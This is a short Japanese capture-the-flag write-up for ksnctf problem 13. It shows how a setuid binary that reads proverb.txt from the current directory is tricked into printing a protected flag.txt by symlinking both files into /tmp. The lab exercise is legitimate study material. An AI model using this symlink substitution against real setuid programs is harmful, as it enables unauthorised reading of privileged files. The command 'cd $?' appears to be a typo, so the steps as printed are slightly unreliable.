## [13. Proverb](http://ksnctf.sweetduet.info/problem/13)

SSHで入った先には以下のファイルが存在する。

```console
[q13@localhost ~]$ ls -l
total 28
-r-------- 16 q13a q13a    22 Jun  1  2012 flag.txt
---s--x--x 13 q13a q13a 14439 Jun  1  2012 proverb
-r--r--r--  1 root root   755 Jun  1  2012 proverb.txt
-r--r--r--  1 root root   151 Jun  1  2012 readme.txt
```

`proverb` を実行すると、`proverb.txt` からランダムに一行選び表示するようだ。
そこで、`proverb.txt` の代わりに `flag.txt` の中身を出力させればよいだろう。

とはいえ `proverb` は引数をとるような挙動はせず、また書き込み権限もない。
そこで、シンボリックリンクによって `proverb.txt` を `flag.txt` にすり替えることを試してみる。

```console
[q13@localhost ~]$ mkdir /tmp/q13-ans
[q13@localhost ~]$ cd $?
[q13@localhost ~]$ ln -s ~/proverb .
[q13@localhost ~]$ ln -s ~/flag.txt proverb.txt
[q13@localhost ~]$ ./proverb
```

これでflagを得る。
